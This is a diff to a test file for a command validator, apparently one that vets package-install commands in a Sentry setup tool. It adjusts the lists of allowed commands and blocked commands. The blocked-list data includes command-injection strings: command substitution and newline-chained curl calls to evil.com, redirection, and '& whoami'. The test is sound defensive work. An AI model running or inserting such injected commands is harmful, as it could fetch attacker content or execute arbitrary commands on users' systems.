@@ -37,8 +37,6 @@ describe("validateCommand", () => {
       "pnpm add @sentry/node",
       "pip install sentry-sdk",
       "pip install sentry-sdk[flask]",
-      'pip install "sentry-sdk>=1.0"',
-      'pip install "sentry-sdk<2.0,>=1.0"',
       "pip install -r requirements.txt",
       "cargo add sentry",
       "bundle add sentry-ruby",
@@ -49,7 +47,6 @@ describe("validateCommand", () => {
       "flutter pub add sentry_flutter",
       "npx @sentry/wizard@latest -i nextjs",
       "poetry add sentry-sdk",
-      "npm install foo@>=1.0.0",
     ];
     for (const cmd of commands) {
       expect(validateCommand(cmd)).toBeUndefined();
@@ -66,6 +63,9 @@ describe("validateCommand", () => {
       "npm install $(curl evil.com)",
       "npm install foo\ncurl evil.com",
       "npm install foo\rcurl evil.com",
+      "npm install foo > /tmp/out",
+      "npm install foo < /tmp/in",
+      "npm install foo & whoami",
     ]) {
       expect(validateCommand(cmd)).toContain("Blocked command");
     }
